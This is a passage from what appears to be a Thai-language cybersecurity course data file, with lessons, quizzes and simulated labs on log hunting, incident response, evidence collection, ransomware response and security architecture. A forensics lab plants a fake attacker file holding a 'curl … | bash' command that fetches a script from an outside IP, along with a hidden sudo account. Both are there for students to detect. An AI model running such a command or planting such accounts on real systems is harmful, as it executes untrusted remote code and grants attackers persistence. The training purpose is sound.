sudo auditctl -w /etc/sudoers -p wa -k scope

<span style="color:#5b6b8c"># ค้นหาเหตุการณ์</span>
sudo ausearch -k identity
sudo ausearch -m avc -ts recent</pre>
<p><b>File Integrity Monitoring</b> — รู้ทันทีเมื่อไฟล์สำคัญถูกแก้</p>
<pre class="code">sudo aide --check                <span style="color:#5b6b8c"># เทียบกับฐานข้อมูลที่เก็บไว้</span>
sha256sum /usr/bin/ls            <span style="color:#5b6b8c"># ตรวจ hash ของไฟล์ทีละตัว</span>
sudo rkhunter --check            <span style="color:#5b6b8c"># สแกนหา rootkit</span></pre>
<div class="note warn"><b>Log ต้องส่งออกนอกเครื่อง</b> — สิ่งแรกที่ผู้โจมตีทำหลังยึดเครื่องได้คือลบ log<br>
ถ้า log อยู่แต่ในเครื่องที่ถูกยึด คุณจะไม่เหลือหลักฐานอะไรเลย ต้องส่งไป syslog server หรือ SIEM แบบ real-time เสมอ</div>`,
        },
      ],
      quiz: [
        { type: 'cmd', q: 'พิมพ์ pipeline นับจำนวนครั้งของแต่ละค่า จากผลลัพธ์ที่ได้จาก grep (เขียนเฉพาะส่วนที่ต่อจาก grep)', ans: ['sort | uniq -c', 'sort | uniq -c | sort -rn'], why: 'uniq -c นับได้เฉพาะบรรทัดที่ติดกัน จึงต้อง sort ก่อนเสมอ แล้วค่อย sort -rn เพื่อเรียงจากมากไปน้อย' },
        { type: 'mcq', q: 'IOC (Indicator of Compromise) หมายถึงอะไร', opts: ['นโยบายความปลอดภัยขององค์กร', 'ร่องรอยที่บ่งชี้ว่าระบบถูกบุกรุกแล้ว เช่น hash ของมัลแวร์ หรือ IP ของ C2', 'ชื่อเรียกของ firewall รุ่นใหม่', 'มาตรฐาน ISO ด้านความปลอดภัย'], a: 1, why: 'IOC ใช้ค้นหาย้อนหลังว่าเครื่องอื่นในองค์กรติดด้วยหรือไม่ และใช้แชร์ข้อมูลระหว่างองค์กร' },
        { type: 'mcq', q: 'ใน MITRE ATT&CK การที่ผู้โจมตีสร้างบัญชีผู้ใช้ใหม่ไว้กลับเข้ามาทีหลัง จัดอยู่ใน tactic ใด', opts: ['Initial Access', 'Persistence', 'Exfiltration', 'Reconnaissance'], a: 1, why: 'Persistence คือการทำให้ยังเข้าถึงระบบได้แม้เครื่องจะรีบูตหรือรหัสผ่านถูกเปลี่ยน — วิธียอดนิยมคือบัญชีใหม่, cron job, service ใหม่' },
        { type: 'mcq', q: 'ทำไม log ต้องถูกส่งออกไปเก็บนอกเครื่อง', opts: ['เพื่อประหยัดพื้นที่ดิสก์', 'เพราะสิ่งแรกที่ผู้โจมตีทำหลังยึดเครื่องได้คือลบ log', 'เพื่อให้ log อ่านง่ายขึ้น', 'ตามข้อกำหนดของ CPU'], a: 1, why: 'log ที่อยู่ในเครื่องที่ถูกยึดเชื่อถือไม่ได้และอาจถูกลบ — การส่งออกแบบ real-time ทำให้ยังมีหลักฐานเหลืออยู่' },
        { type: 'cmd', q: 'พิมพ์คำสั่งดู audit rule ทั้งหมดที่ตั้งไว้ในระบบ', ans: ['auditctl -l', 'sudo auditctl -l'], why: 'ถ้าไม่มี rule เลยแปลว่า auditd อาจยังไม่ทำงาน หรือยังไม่ได้ตั้งค่าเฝ้าไฟล์สำคัญ' },
        { type: 'multi', q: 'ข้อใดคือ IOC ประเภท Host (เลือกทุกข้อที่ถูก)', opts: ['ไฟล์ปฏิบัติการแปลกใน /tmp', 'ผู้ใช้ใหม่ที่ไม่มีใครสร้าง', 'IP ปลายทางของ C2 server', 'cron job ที่ไม่มีใครรู้จัก'], a: [0, 1, 3], why: 'IP ของ C2 เป็น IOC ประเภท Network ส่วนที่เหลือเป็นร่องรอยบนตัวเครื่อง' },
        { type: 'mcq', q: 'ทำไมการมี Baseline ถึงสำคัญต่อการตรวจจับ', opts: ['เพื่อให้รายงานดูดี', 'เพราะจะรู้ว่าอะไรผิดปกติได้ก็ต่อเมื่อรู้ว่าอะไรคือปกติ', 'เพื่อลดขนาด log', 'เพื่อให้ผ่าน audit'], a: 1, why: 'CPU 80% อาจเป็นเรื่องปกติของเครื่องหนึ่งและเป็นสัญญาณอันตรายของอีกเครื่อง — ต้องรู้ค่าปกติก่อน' },
        { type: 'mcq', q: 'File Integrity Monitoring (เช่น AIDE) ช่วยตรวจจับอะไร', opts: ['ไวรัสในอีเมล', 'ไฟล์ระบบสำคัญถูกแก้ไขหรือถูกแทนที่โดยไม่ได้รับอนุญาต', 'ปริมาณ traffic ที่ผิดปกติ', 'รหัสผ่านที่อ่อนแอ'], a: 1, why: 'AIDE เก็บ hash ของไฟล์ไว้แล้วเทียบเป็นระยะ — ถ้า /usr/bin/ls ถูกแทนที่ด้วยเวอร์ชันที่ซ่อนไฟล์ของผู้โจมตี จะตรวจเจอทันที' },
      ],
      labs: [{
        id: 'cy-l3-hunt',
        title: 'Lab 3 — ล่าหาร่องรอยการบุกรุกจาก Log',
        brief: 'ระบบเฝ้าระวังแจ้งเตือนว่าเซิร์ฟเวอร์ตัวนี้มีพฤติกรรมผิดปกติ ให้ไล่หาว่าเกิดอะไรขึ้น ใครทำ และทำอะไรไปบ้าง แล้วทำรายงาน',
        device: 'linux-sec',
        tasks: [
          { t: 'ดูประวัติการล็อกอินที่ล้มเหลว', hint: 'sudo lastb', check: (s, h) => said(h, /lastb/i) },
          { t: 'กรองบรรทัด Failed password จาก auth.log', hint: 'grep "Failed password" /var/log/auth.log', check: (s, h) => said(h, /grep.*failed.*auth\.log/i) },
          { t: 'นับจำนวนครั้งที่ล็อกอินล้มเหลวทั้งหมด', hint: 'grep -c "Failed password" /var/log/auth.log', check: (s, h) => said(h, /grep.*-c|wc\s+-l/i) },
          { t: 'หา IP ที่พยายามเดารหัสมากที่สุดด้วย pipeline (grep → awk → sort → uniq)', hint: 'grep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c | sort -rn', check: (s, h) => said(h, /awk.*\|\s*sort\s*\|\s*uniq/i) },
          { t: 'ตรวจว่ามีใครล็อกอินสำเร็จจาก IP นั้นหรือไม่', hint: 'grep Accepted /var/log/auth.log', check: (s, h) => said(h, /grep.*accepted/i) },
          { t: 'ตรวจรายชื่อผู้ใช้ในระบบว่ามีบัญชีแปลกปลอมไหม', hint: 'cat /etc/passwd | cut -d: -f1', check: (s, h) => said(h, /cut\s+-d/i) },
          { t: 'ตรวจ process ที่กำลังทำงาน', hint: 'ps aux', check: (s, h) => said(h, /^(sudo\s+)?ps\s/i) },
          { t: 'ตรวจการเชื่อมต่อเครือข่ายที่เปิดอยู่', hint: 'ss -tulpn', check: (s, h) => said(h, /^(sudo\s+)?(ss|netstat)/i) },
          { t: 'สแกนหา rootkit', hint: 'sudo rkhunter --check', check: (s, h) => said(h, /rkhunter|chkrootkit/i) },
          { t: 'เปิด <code>auditd</code> เพื่อเก็บหลักฐานต่อจากนี้', hint: 'sudo systemctl start auditd → sudo systemctl enable auditd', check: s => s.services.auditd.active && s.services.auditd.enabled },
          { t: 'ตรวจสอบ audit rule ที่มีอยู่', hint: 'sudo auditctl -l', check: (s, h) => said(h, /auditctl/i) },
          { t: 'สร้างโฟลเดอร์รายงาน <code>/home/analyst/ir</code>', hint: 'mkdir -p /home/analyst/ir', check: s => !!node(s, '/home/analyst/ir') },
          { t: 'บันทึกหลักฐานลงไฟล์ <code>/home/analyst/ir/failed-logins.txt</code>', hint: 'grep "Failed password" /var/log/auth.log > /home/analyst/ir/failed-logins.txt', check: s => (node(s, '/home/analyst/ir/failed-logins.txt')?.content || '').length > 0 },
        ],
      }],
    },

    // =========================================================
    4: {
      title: 'Incident Response และ Forensics',
      objectives: [
        'ทำตามกระบวนการ IR 6 ขั้นตอนได้อย่างเป็นระบบ',
        'ตัดสินใจถูกว่าเมื่อไรควรถอดสายและเมื่อไรไม่ควร',
        'เก็บหลักฐานโดยไม่ทำลายของกลาง',
        'รับมือ ransomware และการรั่วไหลของข้อมูล',
      ],
      sections: [
        {
          t: 'กระบวนการ Incident Response 6 ขั้นตอน',
          h: `
<table class="tbl">
<tr><th>ขั้น</th><th>ทำอะไร</th><th>ข้อผิดพลาดที่พบบ่อย</th></tr>
<tr><td><b>1. Preparation</b></td><td>เตรียมทีม เครื่องมือ runbook สิทธิ์ และเบอร์ติดต่อล่วงหน้า</td><td>ไปเตรียมตอนเกิดเหตุแล้ว</td></tr>
<tr><td><b>2. Identification</b></td><td>ยืนยันว่าเกิดเหตุจริงไหม ขอบเขตแค่ไหน</td><td>รีบสรุปว่า "โดนแล้ว" ทั้งที่เป็น false positive</td></tr>
<tr><td><b>3. Containment</b></td><td>จำกัดความเสียหายไม่ให้ลาม</td><td>รีบปิดเครื่องจนหลักฐานใน RAM หายหมด</td></tr>
<tr><td><b>4. Eradication</b></td><td>กำจัดต้นตอ ปิดช่องที่เข้ามา</td><td>ลบมัลแวร์แต่ไม่ปิดช่องโหว่ → โดนซ้ำ</td></tr>
<tr><td><b>5. Recovery</b></td><td>กู้ระบบกลับมาและเฝ้าดูใกล้ชิด</td><td>กู้จาก backup ที่ติดมัลแวร์อยู่แล้ว</td></tr>
<tr><td><b>6. Lessons Learned</b></td><td>ทบทวนว่าจะป้องกันไม่ให้เกิดซ้ำอย่างไร</td><td>ข้ามขั้นนี้เพราะ "งานยุ่ง" แล้วเกิดซ้ำอีก</td></tr>
</table>
<div class="note warn"><b>คำถามสำคัญที่สุด: ถอดสายเลยไหม?</b><br>
<b>ควรตัดการเชื่อมต่อทันที</b> เมื่อเห็นการเข้ารหัสไฟล์กำลังดำเนินอยู่ หรือกำลังมีข้อมูลไหลออก — ความเสียหายเพิ่มทุกวินาที<br>
<b>ยังไม่ควรปิดเครื่อง</b> ถ้าต้องการหลักฐานใน RAM (process ที่ทำงานอยู่, การเชื่อมต่อเครือข่าย, คีย์เข้ารหัสที่อาจอยู่ในหน่วยความจำ)<br>
ทางสายกลางที่ใช้บ่อย: <b>ถอดสายเครือข่าย แต่ไม่ปิดเครื่อง</b> แล้วเก็บหลักฐานจากเครื่องที่ยังทำงานอยู่</div>`,
        },
        {
          t: 'เก็บหลักฐานโดยไม่ทำลายของกลาง',
          h: `
<p><b>Order of Volatility</b> — เก็บสิ่งที่หายง่ายที่สุดก่อน</p>
<table class="tbl">
<tr><th>ลำดับ</th><th>หลักฐาน</th><th>หายเมื่อ</th></tr>
<tr><td>1</td><td>CPU register, cache</td><td>เสี้ยววินาที</td></tr>
<tr><td>2</td><td>RAM (process, connection, คีย์เข้ารหัส)</td><td>ปิดเครื่อง</td></tr>
<tr><td>3</td><td>สถานะเครือข่าย, session ที่เปิดอยู่</td><td>ตัดการเชื่อมต่อ</td></tr>
<tr><td>4</td><td>ไฟล์ชั่วคราว, /tmp</td><td>รีบูต</td></tr>
<tr><td>5</td><td>ดิสก์</td><td>ถูกเขียนทับ</td></tr>
<tr><td>6</td><td>Log ที่ส่งออกไปแล้ว, backup</td><td>อยู่ได้นาน</td></tr>
</table>
<pre class="code"><span style="color:#5b6b8c"># เก็บหลักฐานจากเครื่องที่ยังทำงานอยู่ (live response)</span>
date &gt;&gt; /mnt/evidence/timeline.txt
w &gt;&gt; /mnt/evidence/who.txt
ps aux &gt;&gt; /mnt/evidence/process.txt
ss -tulpn &gt;&gt; /mnt/evidence/network.txt
last &gt;&gt; /mnt/evidence/logins.txt
lastb &gt;&gt; /mnt/evidence/failed.txt
crontab -l &gt;&gt; /mnt/evidence/cron.txt

<span style="color:#5b6b8c"># ทำ hash ของหลักฐานเพื่อพิสูจน์ว่าไม่ถูกแก้ภายหลัง</span>
sha256sum /mnt/evidence/* &gt; /mnt/evidence/HASHES.txt</pre>
<div class="note"><b>Chain of Custody</b> — บันทึกว่าใครเก็บหลักฐาน เวลาไหน เก็บอย่างไร ส่งต่อให้ใคร<br>
ถ้าเรื่องไปถึงชั้นศาลหรือการสอบสวนภายใน หลักฐานที่ไม่มี chain of custody อาจใช้ไม่ได้เลย</div>`,
        },
        {
          t: 'รับมือ Ransomware',
          h: `
<table class="tbl">
<tr><th>ทำทันที</th><th>ห้ามทำ</th></tr>
<tr><td>ตัดเครื่องที่ติดออกจากเครือข่าย</td><td>อย่ารีบจ่ายค่าไถ่ (ไม่รับประกันว่าจะได้ไฟล์คืน และเป็นการสนับสนุนให้เกิดซ้ำ)</td></tr>
<tr><td>ตรวจว่า backup ปลอดภัยและ <b>ตัด backup ออกจากเครือข่ายทันที</b></td><td>อย่าเชื่อมต่อ backup กับเครือข่ายที่ยังติดอยู่</td></tr>
<tr><td>ระบุว่าเข้ามาทางไหน (patient zero)</td><td>อย่ากู้ระบบก่อนปิดช่องที่เข้ามา</td></tr>
<tr><td>แจ้งผู้บริหารและฝ่ายกฎหมาย</td><td>อย่าปกปิด — หลายกรณีมีข้อผูกพันตามกฎหมายให้ต้องแจ้ง</td></tr>
<tr><td>เก็บตัวอย่างไฟล์ที่ถูกเข้ารหัส + ransom note</td><td>อย่าลบทิ้ง — อาจมีเครื่องมือถอดรหัสฟรีในภายหลัง</td></tr>
</table>
<div class="note warn"><b>PDPA:</b> หากมีข้อมูลส่วนบุคคลรั่วไหลและเสี่ยงกระทบสิทธิ์ของเจ้าของข้อมูล องค์กรมีหน้าที่แจ้งสำนักงานคณะกรรมการคุ้มครองข้อมูลส่วนบุคคล <b>ภายใน 72 ชั่วโมง</b> นับแต่ทราบเหตุ — ทีม IT ต้องรู้และแจ้งฝ่ายที่รับผิดชอบทันที ไม่ใช่รอจนสอบสวนเสร็จ</div>
<p><b>สิ่งที่ป้องกัน ransomware ได้จริง (เรียงตามผลลัพธ์):</b></p>
<ol>
  <li><b>Backup แบบ offline/immutable</b> ที่ทดสอบกู้แล้ว — เป็นสิ่งเดียวที่รับประกันว่ากู้ได้</li>
  <li><b>MFA</b> ทุกช่องทางที่เข้าจากภายนอก</li>
  <li><b>แยกสิทธิ์และแยกเครือข่าย</b> — จำกัดการแพร่</li>
  <li><b>Patch</b> อย่างสม่ำเสมอ</li>
  <li><b>EDR</b> ที่มีคนคอยดู alert จริง ๆ</li>
</ol>`,
        },
      ],
      quiz: [
        { type: 'mcq', q: 'ขั้นตอนใดของ Incident Response ที่มักถูกข้ามและทำให้เกิดเหตุซ้ำ', opts: ['Identification', 'Containment', 'Eradication', 'Lessons Learned'], a: 3, why: 'เมื่อกู้ระบบได้แล้วทุกคนก็กลับไปทำงานปกติ ทำให้ไม่ได้แก้ที่ต้นเหตุเชิงระบบ และเกิดเหตุแบบเดิมซ้ำอีก' },
        { type: 'mcq', q: 'พบว่าเครื่องกำลังถูก ransomware เข้ารหัสไฟล์อยู่ ควรทำอะไรเป็นอันดับแรก', opts: ['ปิดเครื่องทันที', 'ตัดการเชื่อมต่อเครือข่ายเพื่อหยุดการแพร่ แต่ยังไม่ปิดเครื่อง', 'จ่ายค่าไถ่', 'รันโปรแกรมสแกนไวรัส'], a: 1, why: 'ตัดเครือข่ายหยุดการแพร่และการส่งข้อมูลออก ส่วนการปิดเครื่องจะทำให้หลักฐานใน RAM (รวมถึงคีย์เข้ารหัสที่อาจกู้ได้) หายไป' },
        { type: 'mcq', q: 'ตามหลัก Order of Volatility ควรเก็บหลักฐานใดก่อน', opts: ['ไฟล์บนดิสก์', 'ข้อมูลใน RAM และสถานะเครือข่าย', 'backup เก่า', 'log ที่ส่งไป SIEM แล้ว'], a: 1, why: 'เก็บสิ่งที่หายง่ายที่สุดก่อน — RAM หายทันทีเมื่อปิดเครื่อง ส่วน log ที่ส่งออกไปแล้วอยู่ได้นาน' },
        { type: 'mcq', q: 'ตาม PDPA หากมีข้อมูลส่วนบุคคลรั่วไหลที่เสี่ยงกระทบสิทธิ์เจ้าของข้อมูล ต้องแจ้งภายในกี่ชั่วโมง', opts: ['24 ชั่วโมง', '48 ชั่วโมง', '72 ชั่วโมง', 'ไม่ต้องแจ้ง'], a: 2, why: '72 ชั่วโมงนับแต่ทราบเหตุ — ทีม IT ต้องแจ้งฝ่ายที่รับผิดชอบทันทีที่พบ ไม่ใช่รอสอบสวนเสร็จก่อน' },
        { type: 'multi', q: 'ข้อใดคือมาตรการที่ป้องกัน/ลดความเสียหายจาก ransomware ได้จริง (เลือกทุกข้อที่ถูก)', opts: ['Backup แบบ offline ที่ทดสอบกู้แล้ว', 'MFA ทุกช่องทางที่เข้าจากภายนอก', 'จ่ายค่าไถ่ล่วงหน้า', 'แยกสิทธิ์และแยกเครือข่ายเพื่อจำกัดการแพร่'], a: [0, 1, 3], why: 'การจ่ายค่าไถ่ไม่รับประกันว่าจะได้ไฟล์คืน และทำให้องค์กรตกเป็นเป้าซ้ำ — backup ที่ทดสอบแล้วคือสิ่งเดียวที่รับประกันการกู้คืน' },
        { type: 'mcq', q: 'ทำไมต้องทำ hash (SHA256) ของไฟล์หลักฐานที่เก็บมา', opts: ['เพื่อบีบอัดให้เล็กลง', 'เพื่อพิสูจน์ได้ว่าหลักฐานไม่ถูกแก้ไขหลังจากเก็บมา', 'เพื่อเข้ารหัสไฟล์', 'เพื่อให้ค้นหาเร็วขึ้น'], a: 1, why: 'เป็นส่วนหนึ่งของ chain of custody — ถ้า hash ตรงกับตอนเก็บ แปลว่าหลักฐานยังคงสภาพเดิม' },
        { type: 'mcq', q: 'ข้อผิดพลาดใดที่ทำให้ "กู้ระบบแล้วโดนซ้ำ"', opts: ['กู้เร็วเกินไป', 'ลบมัลแวร์แต่ไม่ได้ปิดช่องทางที่ผู้โจมตีใช้เข้ามา', 'ใช้ backup ที่ใหม่เกินไป', 'แจ้งผู้บริหารช้า'], a: 1, why: 'ขั้น Eradication ต้องปิดช่องโหว่ รีเซ็ตรหัสผ่านทั้งหมด และกำจัด persistence ที่ผู้โจมตีวางไว้ ไม่ใช่แค่ลบไฟล์มัลแวร์' },
      ],
      labs: [{
        id: 'cy-l4-ir',
        title: 'Lab 4 — เก็บหลักฐานจากเครื่องที่ถูกบุกรุก',
        brief: 'เครื่องนี้ยืนยันแล้วว่าถูกบุกรุก ผู้บริหารสั่งให้เก็บหลักฐานให้ครบก่อนจะกู้ระบบ — ทำ live response โดยห้ามรีบูตเครื่อง',
        device: 'linux-sec',
        init: {
          apply: st => {
            // ร่องรอยที่ผู้โจมตีทิ้งไว้
            st.fs.children.tmp.children['.hidden'] = { t: 'f', mode: '755', owner: 'root', group: 'root', content: '#!/bin/bash\ncurl -s http://45.9.148.3/x.sh | bash\n' };
            st.users.svc_backup = { uid: 1337, home: '/home/svc_backup', shell: '/bin/bash', groups: ['svc_backup', 'sudo'] };
            const pw = st.fs.children.etc.children.passwd;
            pw.content += 'svc_backup:x:1337:1337::/home/svc_backup:/bin/bash\n';
          },
        },
        tasks: [
          { t: 'สร้างโฟลเดอร์เก็บหลักฐาน <code>/mnt/evidence</code>', hint: 'sudo mkdir -p /mnt/evidence', check: s => !!node(s, '/mnt/evidence') },
          { t: 'บันทึกเวลาที่เริ่มเก็บหลักฐานลง <code>timeline.txt</code>', hint: 'date > /mnt/evidence/timeline.txt', check: s => (node(s, '/mnt/evidence/timeline.txt')?.content || '').length > 3 },
          { t: 'บันทึกผู้ที่ล็อกอินอยู่ลง <code>who.txt</code>', hint: 'w > /mnt/evidence/who.txt', check: s => (node(s, '/mnt/evidence/who.txt')?.content || '').length > 3 },
          { t: 'บันทึก process ทั้งหมดลง <code>process.txt</code>', hint: 'ps aux > /mnt/evidence/process.txt', check: s => (node(s, '/mnt/evidence/process.txt')?.content || '').length > 3 },
          { t: 'บันทึกการเชื่อมต่อเครือข่ายลง <code>network.txt</code>', hint: 'ss -tulpn > /mnt/evidence/network.txt', check: s => (node(s, '/mnt/evidence/network.txt')?.content || '').length > 3 },
          { t: 'บันทึกประวัติล็อกอินล้มเหลวลง <code>failed.txt</code>', hint: 'lastb > /mnt/evidence/failed.txt', check: s => (node(s, '/mnt/evidence/failed.txt')?.content || '').length > 3 },
          { t: 'ตรวจหาบัญชีแปลกปลอมในระบบ', hint: 'cat /etc/passwd | cut -d: -f1', check: (s, h) => said(h, /passwd/i) },
          { t: 'ตรวจไฟล์ที่ซ่อนอยู่ใน <code>/tmp</code>', hint: 'ls -la /tmp', check: (s, h) => said(h, /ls\s+-l?a/i) },
          { t: 'ดูเนื้อหาไฟล์ต้องสงสัย <code>/tmp/.hidden</code>', hint: 'cat /tmp/.hidden', check: (s, h) => said(h, /cat\s+\/tmp\/\.hidden/i) },
          { t: 'ทำ hash ของไฟล์ต้องสงสัยเพื่อเป็น IOC', hint: 'sha256sum /tmp/.hidden', check: (s, h) => said(h, /sha256sum|md5sum/i) },
          { t: 'สแกนหา rootkit เพื่อยืนยันการบุกรุก', hint: 'sudo rkhunter --check', check: (s, h) => said(h, /rkhunter|chkrootkit/i) },
          { t: 'ตรวจความถูกต้องของไฟล์ระบบด้วย AIDE', hint: 'sudo aide --check', check: (s, h) => said(h, /aide/i) },
          { t: 'บันทึกรายการ cron ลง <code>cron.txt</code>', hint: 'crontab -l > /mnt/evidence/cron.txt', check: s => (node(s, '/mnt/evidence/cron.txt')?.content || '').length > 3 },
          { t: 'ตัดการเข้าถึงจากภายนอก: เปิด firewall แบบ deny incoming', hint: 'sudo ufw default deny incoming → sudo ufw enable', check: s => s.ufw.active },
        ],
      }],
    },

    // =========================================================
    5: {
      title: 'ออกแบบระบบความปลอดภัยทั้งองค์กร',
      objectives: [
        'ออกแบบสถาปัตยกรรมแบบ Defense in Depth และ Zero Trust',
        'วางระบบ SOC / SIEM และเลือกสิ่งที่ควร monitor',
        'จัดทำนโยบายและปฏิบัติตามมาตรฐาน (ISO 27001 / PDPA)',
        'วางแผนความต่อเนื่องทางธุรกิจและซ้อมรับมือ',
      ],
      sections: [
        {
          t: 'Defense in Depth และ Zero Trust',
          h: `
<p><b>Defense in Depth</b> — ไม่มีมาตรการใดสมบูรณ์แบบ จึงต้องวางหลายชั้น เพื่อให้เมื่อชั้นหนึ่งถูกเจาะ ยังมีชั้นถัดไป</p>
<table class="tbl">
<tr><th>ชั้น</th><th>มาตรการ</th></tr>
<tr><td>Physical</td><td>ล็อกห้องเซิร์ฟเวอร์, กล้อง, คีย์การ์ด</td></tr>
<tr><td>Perimeter</td><td>Firewall, IPS, DDoS protection</td></tr>
<tr><td>Network</td><td>แบ่ง VLAN/segment, NAC (802.1X), micro-segmentation</td></tr>
<tr><td>Endpoint</td><td>EDR, disk encryption, patch management</td></tr>
<tr><td>Application</td><td>WAF, secure coding, dependency scanning</td></tr>
<tr><td>Data</td><td>เข้ารหัส, DLP, การจำแนกชั้นความลับ</td></tr>
<tr><td>Identity</td><td>MFA, PAM, least privilege, การทบทวนสิทธิ์</td></tr>
<tr><td>People</td><td>อบรม, ซ้อม phishing, วัฒนธรรมที่กล้ารายงาน</td></tr>
</table>
<div class="note"><b>Zero Trust — "อย่าเชื่อ ตรวจสอบเสมอ"</b><br>
โมเดลเดิมคิดว่า "ข้างในเครือข่าย = ปลอดภัย" ซึ่งไม่จริงอีกต่อไปเมื่อคนทำงานจากที่บ้านและระบบอยู่บนคลาวด์<br>
หลักของ Zero Trust: ยืนยันตัวตนทุกครั้ง · ให้สิทธิ์น้อยที่สุด · สมมติว่าถูกเจาะแล้วเสมอ (assume breach) · ตรวจสอบทั้งผู้ใช้ อุปกรณ์ และบริบท</div>`,
        },
        {
          t: 'SOC, SIEM และสิ่งที่ควรเฝ้า',
          h: `
<table class="tbl">
<tr><th>ส่วนประกอบ</th><th>หน้าที่</th></tr>
<tr><td><b>SIEM</b></td><td>รวม log จากทุกระบบ ตั้งกฎแจ้งเตือน และค้นย้อนหลังได้</td></tr>
<tr><td><b>EDR/XDR</b></td><td>เฝ้าพฤติกรรมบน endpoint และตอบสนองอัตโนมัติ</td></tr>
<tr><td><b>SOAR</b></td><td>ทำ playbook อัตโนมัติ เช่น พบ IOC → แบน IP → เปิด ticket</td></tr>
<tr><td><b>Threat Intel</b></td><td>ฟีด IOC และข้อมูลกลุ่มผู้โจมตี</td></tr>
</table>
<p><b>Log ที่ต้องส่งเข้า SIEM เป็นอย่างแรก</b> (เรียงตามความคุ้มค่า):</p>
<ol>
  <li>Authentication ทั้งหมด (AD, VPN, SSH, คลาวด์) — จับ credential attack</li>
  <li>การเปลี่ยนแปลงสิทธิ์และการสร้างบัญชี — จับ persistence/privilege escalation</li>
  <li>Firewall / proxy ขาออก — จับ C2 และการส่งข้อมูลออก</li>
  <li>EDR alert — จับพฤติกรรมมัลแวร์</li>
  <li>Log ของระบบสำคัญทางธุรกิจ</li>
</ol>
<table class="tbl">
<tr><th>ตัวชี้วัดของ SOC</th><th>ความหมาย</th><th>ทำไมสำคัญ</th></tr>
<tr><td><b>MTTD</b></td><td>เวลาเฉลี่ยกว่าจะ<b>ตรวจพบ</b></td><td>ยิ่งนาน ผู้โจมตียิ่งเดินได้ลึก</td></tr>
<tr><td><b>MTTR</b></td><td>เวลาเฉลี่ยกว่าจะ<b>ตอบสนอง/แก้ไข</b></td><td>วัดประสิทธิภาพของกระบวนการ</td></tr>
<tr><td><b>False positive rate</b></td><td>สัดส่วน alert ที่ไม่ใช่เหตุจริง</td><td>สูงเกินไป = ทีมเลิกอ่าน alert</td></tr>
</table>
<div class="note warn"><b>alert ที่ไม่มีคนอ่าน = ไม่มี alert</b> — องค์กรจำนวนมากซื้อ SIEM แล้วตั้ง rule ไว้หลายร้อยข้อ จนทีมได้ alert วันละพันรายการและเลิกสนใจ<br>
ควรเริ่มจาก use case น้อย ๆ ที่มีคุณค่าสูง แล้วปรับจูนจนแม่นก่อนเพิ่มอันถัดไป</div>`,
        },
        {
          t: 'นโยบาย มาตรฐาน และการซ้อม',
          h: `
<table class="tbl">
<tr><th>มาตรฐาน</th><th>เกี่ยวกับอะไร</th><th>ใช้เมื่อ</th></tr>
<tr><td><b>ISO/IEC 27001</b></td><td>ระบบบริหารความมั่นคงปลอดภัยสารสนเทศ (ISMS)</td><td>องค์กรต้องการรับรองมาตรฐานสากล</td></tr>
<tr><td><b>NIST CSF</b></td><td>กรอบ Identify → Protect → Detect → Respond → Recover</td><td>ใช้ประเมินความพร้อมและวางแผนพัฒนา</td></tr>
<tr><td><b>CIS Controls</b></td><td>18 มาตรการเรียงตามลำดับความสำคัญ</td><td>อยากรู้ว่า "ควรทำอะไรก่อน"</td></tr>
<tr><td><b>PDPA</b></td><td>กฎหมายคุ้มครองข้อมูลส่วนบุคคลของไทย</td><td>ทุกองค์กรที่เก็บข้อมูลบุคคล (บังคับตามกฎหมาย)</td></tr>
<tr><td><b>PCI DSS</b></td><td>ความปลอดภัยของข้อมูลบัตรชำระเงิน</td><td>องค์กรที่รับชำระด้วยบัตร</td></tr>
</table>
<p><b>นโยบายที่องค์กรควรมีเป็นอย่างน้อย:</b> Acceptable Use · Password/Authentication · Access Control · Incident Response · Backup &amp; DR · Change Management · Vendor/Third-party Risk · Data Classification</p>
<div class="note"><b>ซ้อมก่อนเกิดจริง</b><br>
<b>Tabletop exercise</b> — นั่งคุยกันตามสถานการณ์สมมติ ใช้เวลา 2 ชั่วโมง ต้นทุนต่ำ แต่เห็นช่องโหว่ของกระบวนการชัดมาก<br>
<b>ซ้อมกู้ backup</b> — อย่างน้อยปีละครั้ง พร้อมจับเวลาว่าทำได้ตาม RTO ที่ตกลงไว้หรือไม่<br>
<b>ซ้อม phishing</b> — วัดอัตราการกดลิงก์ของพนักงาน แล้วใช้เป็นตัวชี้วัดของการอบรม (เพื่อพัฒนา ไม่ใช่เพื่อลงโทษ)</div>
<p><b>BCP/DR ที่ต้องตกลงกับฝ่ายธุรกิจ ไม่ใช่ IT ตัดสินเอง:</b></p>
<table class="tbl">
<tr><th>ค่า</th><th>คำถามที่ต้องถามธุรกิจ</th><th>ผลต่อการออกแบบ</th></tr>
<tr><td><b>RPO</b></td><td>ยอมเสียข้อมูลย้อนหลังได้กี่นาที/ชั่วโมง</td><td>กำหนดความถี่ของ backup / replication</td></tr>
<tr><td><b>RTO</b></td><td>ยอมให้ระบบใช้ไม่ได้นานแค่ไหน</td><td>กำหนดว่าต้องลงทุน HA มากแค่ไหน</td></tr>
</table>`,
        },
      ],
      quiz: [
        { type: 'mcq', q: 'หลักการสำคัญที่สุดของ Zero Trust คืออะไร', opts: ['ไม่ให้ใครเข้าถึงระบบเลย', 'ไม่เชื่อโดยอัตโนมัติแม้จะอยู่ในเครือข่ายภายใน ต้องยืนยันตัวตนและตรวจสอบทุกครั้ง', 'ใช้ firewall ที่แพงที่สุด', 'เก็บข้อมูลทั้งหมดไว้ในองค์กร'], a: 1, why: 'โมเดลเดิมที่ถือว่า "ข้างในปลอดภัย" ใช้ไม่ได้แล้ว เพราะผู้โจมตีที่เจาะเข้ามาได้ก็จะกลายเป็น "คนใน" ทันที' },
        { type: 'mcq', q: 'MTTD ในบริบทของ SOC หมายถึงอะไร', opts: ['เวลาเฉลี่ยที่ใช้แก้ไขปัญหา', 'เวลาเฉลี่ยกว่าจะตรวจพบเหตุการณ์', 'จำนวน alert ต่อวัน', 'ค่าใช้จ่ายเฉลี่ยต่อเหตุการณ์'], a: 1, why: 'MTTD = Mean Time To Detect ยิ่งนานผู้โจมตียิ่งมีเวลาเคลื่อนที่ในระบบ ส่วน MTTR คือเวลาที่ใช้ตอบสนอง/แก้ไข' },
